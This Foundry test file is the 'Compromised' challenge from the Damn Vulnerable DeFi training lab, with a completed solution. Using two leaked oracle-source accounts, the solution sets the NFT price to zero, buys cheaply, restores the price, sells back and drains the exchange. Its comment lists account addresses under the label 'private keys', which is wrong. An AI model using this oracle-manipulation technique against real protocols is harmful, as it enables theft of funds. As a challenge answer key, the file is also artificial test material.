// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        /*
            The readme file contains two private keys that correspond to the trusted sources.
            The way to decode them was to convert int from hex to string(base64) and then base64 to string.
            The private keys are:
            1. 0x188Ea627E3531Db590e6f1D71ED83628d1933088
            2. 0xA417D473c40a4d42BAd35f147c21eEa7973539D8

            The attack vector is to buy a nft from the exchange with low price and then sell it back to the exchange with a high price.
            To drain the exchange of all its eth, we can use the oracle to manipulate the price of the nft.
            We can do it since we have control over the trusted sources.
        */
        // We have control over sources[0] and sources[1]
        // We can manipulate the price of the nft
        vm.prank(sources[0]);
        oracle.postPrice("DVNFT", 0);
        vm.prank(sources[1]);
        oracle.postPrice("DVNFT", 0);

        // Buy the nft from the exchange, since the price is 0, we can buy it with 1 wei (it will be refunded)
        vm.prank(player);
        exchange.buyOne{value: 1 wei}();
        
        // change the price of the nft to a high value that drains the exchange of all its eth
        // 999 ether + 0.1 ether = 999.1 ether
        vm.prank(sources[0]);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(sources[1]);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        // Sell the nft back to the exchange
        vm.startPrank(player);
        // we need to first approve the exchange to transfer the nft
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);

        // transfer the eth from the exchange to the recovery account
        recovery.call{value: INITIAL_NFT_PRICE}("");

        vm.stopPrank();

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
